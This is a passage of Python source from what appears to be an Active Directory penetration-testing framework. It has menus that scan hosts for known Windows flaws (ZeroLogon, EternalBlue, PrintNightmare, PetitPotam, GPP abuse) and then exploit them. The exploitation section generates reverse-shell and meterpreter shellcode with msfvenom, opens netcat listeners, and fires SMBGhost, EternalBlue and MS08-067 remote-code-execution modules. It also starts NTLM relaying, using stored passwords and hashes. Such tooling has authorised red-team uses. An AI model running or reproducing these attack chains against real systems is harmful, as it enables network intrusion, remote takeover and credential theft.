                        results = rpcdump_scanner.scan('', '', domain_name, None, row['host'], row['port'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/printerbug_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToPrinterBug']},anonymous\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")



        # ATTACKING DOMAIN CONTROLLERS
        if os.path.isfile(f"{cwd}/known-data/accounts/domain-controllers_list.txt"):
            df_dc = pandas.read_csv(f"{cwd}/known-data/accounts/domain-controllers_list.txt")
            for index, row in df_dc.iterrows():
                # Attack: ZeroLogon (or CVE-2020-1472)
                if option_numero == 9:
                    if row['domain_controller_hostname'] is None or pandas.isna(row['domain_controller_hostname']):
                        print(f"{bcolors.FAIL}The domain controller name is not specified...{bcolors.ENDC}")
                        break
                    print(f"{bcolors.WARNING}Trying ZeroLogon (or CVE-2020-1472) attack against {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']})...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-zerologon_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-zerologon_vulns-ip") else pandas.DataFrame()
                    if df.empty or not (df[0] == row['domain_controller_ip']).any():
                        results = zerologon_scanner.scan(f"\\\\{row['domain_controller_hostname']}", row['domain_controller_ip'], row['domain_controller_hostname'], 135)
                        if results:
                            file = open(f"{cwd}/known-data/vulns/cve-zerologon_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToZeroLogon']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The domain controller: {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']}) has already been scanned.{bcolors.ENDC}")

                # Attack: GPP abuse without account
                elif option_numero == 10:
                    print(f"{bcolors.WARNING}Trying GPP Abuse attack against {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']})...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip") else pandas.DataFrame()
                    if df.empty or not (df[0] == row['domain_controller_ip']).any(): # add and username
                        results = gppabuse_scanner.scan(username='guest', password='', domain=domain_name, target_ip=row['domain_controller_ip'], port=445, lmhash=None, nthash=None, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None)
                        if results:
                            file = open(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToGPPAbuse']},{results['username']}\n")
                            file.close()
                        results = gppabuse_scanner.scan(username='', password='', domain=domain_name, target_ip=row['domain_controller_ip'], port=445, lmhash=None, nthash=None, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None)
                        if results:
                            file = open(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToGPPAbuse']},anonymous\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The domain controller: {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']}) has already been scanned.{bcolors.ENDC}")
        else:
            print(f"{bcolors.FAIL}No DCs have been found.{bcolors.ENDC}")

        # ATTACKING RDG PORTS: 3391
        files_RDG = [filename for filename in os.listdir(f"{cwd}/known-data/network") if filename.startswith("open-RDG-ip_")]
        for file in files_RDG:
            df_rdg = pandas.read_csv(f"{cwd}/known-data/network/{file}", sep=";")
            for index, row in df_rdg.iterrows():
                # Attack: BlueGate (or CVE-2020-0610)
                if option_numero == 11:
                    print(f"{bcolors.WARNING}Trying BlueGate (or CVE-2020-0610) attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-bluegate_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-bluegate_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port'])).any():
                        connection = bluegate_scanner.Connection(row['host'], row['port'])
                        results = connection.is_vulnerable()
                        if results:
                            file = open(f"{cwd}/known-data/vulns/cve-bluegate_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToBlueGate']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

        if option_numero == 12:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return
        print(f"{bcolors.OKBLUE}=> The files are saved into known-data/vulns{bcolors.ENDC}")

def scanning_vulns_with_domain_account():
    '''Searching known vulns with domain account'''
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES WITH DOMAIN ACCOUNT] menu...{bcolors.ENDC}")
    print(f"{bcolors.BOLD}The known attacks are:{bcolors.ENDC}")
    print(f"{bcolors.OKBLUE}=> EternalBlue, PrintNightmare, MIC Remove attack, PetitPotam, sAMAccountName spoofing, Coerce (PrinterBug, DFSCoerce, etc.){bcolors.ENDC}")
    scan_vuln_menu_options =  {
        1: "Option 01: Searching for IP vulnerable to Eternal Blue (or MS17-010) attack",
        2: "Option 02: Searching for IP vulnerable to PrintNightmare attack",
        3: "Option 03: Searching for IP vulnerable to MIC Remove attack",
        4: "Option 04: Searching for IP vulnerable to PetitPotam attack",
        5: "Option 05: Searching for IP vulnerable to sAMAccountName spoofing attack",
        6: "Option 06: Searching for IP vulnerable to GPP Abuse with account attack",
        7: "Option 07: Searching for IP vulnerable to SMB Pipes attacks",
        8: "Option 08: Return to the main menu",
    }

    print("For these attacks, you must use a domain account...")
    df = pandas.read_csv(f"{cwd}/known-data/accounts/dom-users_list.txt",)
    if not df.empty:    
        print(f"\n{bcolors.BOLD}Choose among the following accounts: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        domain_name = df.loc[row_chosen, 'domain']
        username = df.loc[row_chosen, 'username']
        password = df.loc[row_chosen, 'password']
        ntlm_hash = df.loc[row_chosen, 'NTLM_hash']
        print(f"{bcolors.HEADER}The chosen user : {df.loc[row_chosen, 'domain']}/{df.loc[row_chosen, 'username']} (password: {df.loc[row_chosen, 'password']}, hash: {df.loc[row_chosen, 'NTLM_hash']}).{bcolors.ENDC}")
    else:
        print(f"{bcolors.FAIL}There are no domain users...\n{bcolors.ENDC}")
        return

    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        return

    while True:
        option_numero = print_menu(scan_vuln_menu_options)

        if password is None and ntlm_hash is None:
            print("The users used doesn't have any password or hashes specified.")
        if pandas.isna(ntlm_hash) or ntlm_hash is None:
            lmhash, nthash = None, None
            ntlm_hash = None
        else:
            lmhash, nthash = ntlm_hash.split(':')

        # ATTACKING SMB PORTS : 445
        files_microsoftDS = [filename for filename in os.listdir(f"{cwd}/known-data/network") if filename.startswith("open-microsoftDS-ip_")]
        for file in files_microsoftDS:
            df_smb = pandas.read_csv(f"{cwd}/known-data/network/{file}", sep=";")
            for index, row in df_smb.iterrows():

                # Attack: Eternal Blue (or MS17-010): with eternalblue_ms17010_scanner.py
                if option_numero == 1:
                    print(f"{bcolors.WARNING}Trying Eternal Blue attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port']) & (df[3] == username)).any():
                        results = eternalblue_scanner.scan(target_ip=row['host'], port=row['port'], username=username, password=password, hashes=ntlm_hash)
                        if results:
                            file = open(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToEternalBlue']},{username}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: PrintNightmare (or CVE-2021-1675) with eternalblue_cve20211675_scanner.py
                elif option_numero == 2:
                    print(f"{bcolors.WARNING}Trying PrintNightmare (or CVE-2021-1675) attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-printnightmare_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-printnightmare_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port']) & (df[3] == username)).any():
                        results = printnightmare_scanner.scan(row['host'], row['port'], username, password, domain_name, ntlm_hash, kerberos=False)
                        if results:
                            file = open(f"{cwd}/known-data/vulns/cve-printnightmare_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToPrintNightmare']},{username}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

                # Attack: MIC Remove attack (or CVE-2019-1040) with micRA_cve20191040_scanner.py
                elif option_numero == 3:
                    print(f"{bcolors.WARNING}Trying MIC Remove attack (or CVE-2019-1040) against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/micRA_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/micRA_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port']) & (df[3] == username)).any():
                        results = micra_scanner.scan(row['host'], row['port'], username, password, '', ntlm_hash)
                        if results:
                            file = open(f"{cwd}/known-data/vulns/micRA_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToMICRA']},{username}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")

        files_RPC = [filename for filename in os.listdir(f"{cwd}/known-data/network") if filename.startswith("open-RPC-ip_")]
        # ATTACKING RPC PORTS : 135, 593
        for file in files_RPC:
            df_rpc = pandas.read_csv(f"{cwd}/known-data/network/{file}", sep=";")
            for index, row in df_rpc.iterrows():
                # Attack: PetitPotam with session attack
                if option_numero == 4:
                    print(f"{bcolors.WARNING}Trying PetitPotam attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/petitpotam_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/petitpotam_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port']) & (df[3] == username)).any():
                        results = petitpotam_scanner.scan(username, password, domain_name, lmhash, nthash, row['host'], row['host'], row['port'], pipe='lsarpc')
                        if results:
                            file = open(f"{cwd}/known-data/vulns/petitpotam_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToPetitPotam']},{username}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")


        # ATTACKING DOMAIN CONTROLLERS
        if os.path.isfile(f"{cwd}/known-data/accounts/domain-controllers_list.txt"):
            df_dc = pandas.read_csv(f"{cwd}/known-data/accounts/domain-controllers_list.txt")
            for index, row in df_dc.iterrows():
                # Attack: sAMAccountName spoofing attack (or CVE-2021-42XX) with sAMAccountName_cve20214227_scanner.py
                if option_numero == 5:
                    if row['domain_controller_hostname'] is None or pandas.isna(row['domain_controller_hostname']):
                        print(f"{bcolors.FAIL}The domain controller name is not specified...{bcolors.ENDC}")
                        break
                    print(f"{bcolors.WARNING}Trying sAMAccountName spoofing attack (or CVE-2021-42XX) attack against {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']})...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip") else pandas.DataFrame()
                    if df.empty or not (df[0] == row['domain_controller_ip']).any():
                        results = samaccountspoof_scanner.scan(username, password, domain_name, lmhash, nthash, row['domain_controller_hostname'])
                        if results:
                            file = open(f"{cwd}/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableTosAMAccountSpoofing']},{username},{results['domain']},{results['hostname']}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The domain controller: {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']}) has already been scanned.{bcolors.ENDC}")

                # Attack: GPP Abuse
                elif option_numero == 6:
                    print(f"{bcolors.WARNING}Trying GPP Abuse attack against {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']})...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/gppabuse_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/gppabuse_vulns-ip") else pandas.DataFrame()
                    if df.empty or not (df[0] == row['domain_controller_ip']).any():
                        # aesKey = 128 bits or 256 bits
                        results = gppabuse_scanner.scan(username, password, domain_name, row['domain_controller_ip'], 445, lmhash, nthash, share="SYSVOL", base_dir="/")
                        if results:
                            file = open(f"{cwd}/known-data/vulns/gppabuse_vulns-ip", "a", encoding="utf-8")
                            file.write(f"{results['ip']},{results['port']},{results['vulnerableToGPPAbuse']},{username}\n")
                            file.close()
                    else:
                        print(f"{bcolors.FAIL}The domain controller: {row['domain_controller_hostname']} (ip: {row['domain_controller_ip']}) has already been scanned.{bcolors.ENDC}")
        else:
            print(f"{bcolors.FAIL}No DCs have been found.{bcolors.ENDC}")

        if option_numero == 8:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return
        print(f"{bcolors.OKBLUE}=> The files are saved into known-data/vulns{bcolors.ENDC}")

def scanning_vulns_with_local_account():
    '''Function to searching known vulns with local account'''
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES WITH LOCAL ACCOUNT] menu...{bcolors.ENDC}")
    print(f"{bcolors.BOLD}The known attacks are:{bcolors.ENDC}")
    print(f"{bcolors.OKBLUE}=> HiveNightmare{bcolors.ENDC}")
    scan_vuln_menu_options =  {
        1: "Option 01: Searching for IP vulnerable to HiveNightmare aka Serious SAM (or CVE) attack",
        2: "Option 02: Return to the main menu",
    }

    print("For these attacks, you must use a local account...")
    df = pandas.read_csv(f"{cwd}/known-data/accounts/local-users_list.txt",)
    if not df.empty:        
        print(f"\n{bcolors.BOLD}Choose among the following accounts: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        username = df.loc[row_chosen, 'username']
        password = df.loc[row_chosen, 'password']
        ntlm_hash = df.loc[row_chosen, 'NTLM_hash']
        print(f"{bcolors.HEADER}The chosen user : {df.loc[row_chosen, 'username']} (password: {df.loc[row_chosen, 'password']}, hash: {df.loc[row_chosen, 'NTLM_hash']}).{bcolors.ENDC}")
    else:
        print(f"{bcolors.FAIL}There are no domain users...\n{bcolors.ENDC}")
        return

    #if os.path.isfile(f"{cwd}/known-data/accounts/domain-infos_list.txt"):
    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        return

    while True:
        option_numero = print_menu(scan_vuln_menu_options)

        # ATTACKING SMB PORTS : 445
        files_microsoftDS = [filename for filename in os.listdir(f"{cwd}/known-data/network") if filename.startswith("open-microsoftDS-ip_")]
        for file in files_microsoftDS:
            df_smb = pandas.read_csv(f"{cwd}/known-data/network/{file}", sep=";")
            for index, row in df_smb.iterrows():

                # Attack: HiveNightmare (or CVE): with hivenightmare_cve_scanner.ps1
                if option_numero == 1:
                    print(f"{bcolors.WARNING}Trying HiveNightmare attack against {row['host']}:{row['port']}...{bcolors.ENDC}")
                    df = pandas.read_csv(f"{cwd}/known-data/vulns/hivenightmare_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/hivenightmare_vulns-ip") else pandas.DataFrame()
                    if df.empty or not ((df[0] == row['host']) & (df[1] == row['port']) & (df[3] == username)).any():
                        # get hostname of the targeted IP
                        print(f"\n{bcolors.WARNING}NOT IMPLEMENTED FOR NOW{bcolors.ENDC}")
                        return
                        # currently working on it on the dev branch
                    else:
                        print(f"{bcolors.FAIL}The ip: {row['host']}:{row['port']} has already been scanned.{bcolors.ENDC}")


        if option_numero == 2:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return
        print(f"{bcolors.OKBLUE}=> The files are saved into known-data/vulns{bcolors.ENDC}")

def scanning_vulns_with_local_adm_account():
    '''Function to searching known vulns with local administrator account'''
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES WITH LOCAL ADM ACCOUNT] menu...{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}Returning to the main menu because it is still not implemented...{bcolors.ENDC}")


def searching_vulns():
    '''Searching known vulns menu'''
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES] menu...{bcolors.ENDC}")
    scan_vuln_menu_options = {
		1: "Option 1: Scanning without any accounts",
		2: "Option 2: Scanning with a domain account (with low privs)",
		3: "Option 3: Scanning with a local account (with low privs)",
		4: "Option 4: Scanning with a local account (with high privs)",
        5: "Option 5: Return to the main menu"
    }
    while True:
        option_numero = print_menu(scan_vuln_menu_options)
        if option_numero == 1:
            scanning_vulns_without_account()
        elif option_numero == 2:
            scanning_vulns_with_domain_account()
        elif option_numero == 3:
            scanning_vulns_with_local_account()
        elif option_numero == 4:
            scanning_vulns_with_local_adm_account()
        elif option_numero == 5:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return


def exploiting_vulns_without_account():
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES WITHOUT ACCOUNT] menu...{bcolors.ENDC}")
    print(f"{bcolors.BOLD}The known attacks are:{bcolors.ENDC}")
    print(f"{bcolors.OKBLUE}=> ZeroLogon, SMBGhost, SMBleed, BlueGate, MS14-068, MS08-67, SMB Signing{bcolors.ENDC}")
    scan_vuln_menu_options =  {
        1: "Option 01: Exploiting IP vulnerable to SMBGhost attack...                       [!!]",
        2: "Option 02: Exploiting IP vulnerable to SMBleed attack...                        [!!]",
        3: "Option 03: Exploiting IP vulnerable to MS17-010 attack...                       [!!]",
        4: "Option 04: Exploiting IP vulnerable to MS08-067...                              [!!!]",
        5: "Option 05: Exploiting IP vulnerable to PetitPotam with null session attack...   []",
        6: "Option 06: Exploiting IP vulnerable to SMB Signing attack...                    []",
        7: "Option 07: Exploiting IP vulnerable to PrinterBug (or SpoolSample) attack...    []",
        8: "Option 08: Exploiting IP vulnerable to MS14-068 (Kerberos Checksum) attack...   []",
        9: "Option 09: Exploiting IP vulnerable to ZeroLogon attack...                      [!!!]",
        10: "Option 10: Exploiting IP vulnerable to GPP abuse attack...                     []",
        11: "Option 11: Exploiting IP vulnerable to BlueGate attack...                      [!!!]",
        12: "Option 12: Return to the main menu"
    }
    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        return

    while True:
        option_numero = print_menu(scan_vuln_menu_options)
        # ATTACKING SMB PORTS : 445
        # Attack: SMBGhost (or CVE-2020-0796) with smbghost_cve20200796.py
        if option_numero == 1:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-smbghost_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-smbghost_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying SMBGhost attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr, lport = get_listening_addr()
                try:
                    bashCommand = f"msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST={ip_addr} LPORT={lport} -f python -o {cwd}/known-data/exploits/shellcodex64_smbghost"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The shellcode was not successfully created with MSFVenom...{bcolors.ENDC}")
                    break
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}:{lport}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'netcat -lvnp {lport}; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                smbghost_poc.do_rce(ip, port, f"{cwd}/known-data/exploits/shellcodex64_smbghost")
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # Attack: SMBleed (or CVE-2020-1206) with smbleed_cve20201206_scanner.py
        elif option_numero == 2:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-smbleed_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-smbleed_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying SMBleed attack against {ip}:{port}...{bcolors.ENDC}")
                print(f"\n{bcolors.WARNING}NOT IMPLEMENTED FOR NOW{bcolors.ENDC}")
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # Attack: Eternal Blue (or MS17-010): with eternalblue_ms17010_scanner.py
        elif option_numero == 3:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying Eternal Blue attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr, lport = get_listening_addr()
                try:
                    bashCommand = f"msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST={ip_addr} LPORT={lport} -o {cwd}/known-data/exploits/shellcodex64_eternalblue"
                    subprocess.run(bashCommand, shell=True, check=False)
                    bashCommand = f"msfvenom -p windows/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST={ip_addr} LPORT={lport} -o {cwd}/known-data/exploits/shellcodex86_eternalblue"
                    subprocess.run(bashCommand, shell=True, check=False)
                    eternalblue_poc.merge_shellcode(f"{cwd}/known-data/exploits/shellcodex64_eternalblue", f"{cwd}/known-data/exploits/shellcodex86_eternalblue", f"{cwd}/known-data/exploits/shellcodeall_eternalblue")
                except Exception:
                    print(f"{bcolors.WARNING}The shellcode were not successfully created with MSFVenom....{bcolors.ENDC}")
                    break
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}:{lport}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'netcat -lvnp {lport}; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                eternalblue_poc.exploit(ip, f"{cwd}/known-data/exploits/shellcodeall_eternalblue", 13)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # Attack: Netapi (or MS08-067) with netapi_scanner.py
        elif option_numero == 4:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/ms08-67_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/ms08-67_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying MS08-067 attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr, lport = get_listening_addr()
                print(f"{bcolors.WARNING}You will be listening onto {ip_addr}:{lport}...{bcolors.ENDC}")
                # now select the port to listening
                try:
                    bashCommand = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip_addr} LPORT={lport} EXITFUNC=thread -b \"\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40\" -f c -a x86 --platform windows > {cwd}/known-data/exploits/shellcode_ms08"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The shellcode was not successfully created with MSFVenom....{bcolors.ENDC}")
                    continue
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}:{lport}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'netcat -lvnp {lport}; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                current = netapi_poc.SRVSVC_Exploit(f"{cwd}/known-data/exploits/shellcode_ms08", ip_addr, os, lport)
                current.start()
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # Attack: NTLM Relayx / SMB Signing
        elif option_numero == 6:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/smb_signing_disabled", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/smb_signing_disabled") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Checking SMB signing against {ip}:{port}...{bcolors.ENDC}")
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session for ntlmrelayx onto the target {ip}:{port}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'sudo python3 {cwd}/POC/ntlmrelayx.py -t {ip} -l {cwd}/known-data/exploits/ntlmrelayx_loot_{ip}; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                    time.sleep(10)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # ATTACKING RPC PORTS : 135, 593
        # Attack: PetitPotam with nullsession
        if option_numero == 5:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/petitpotam-nullsession_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
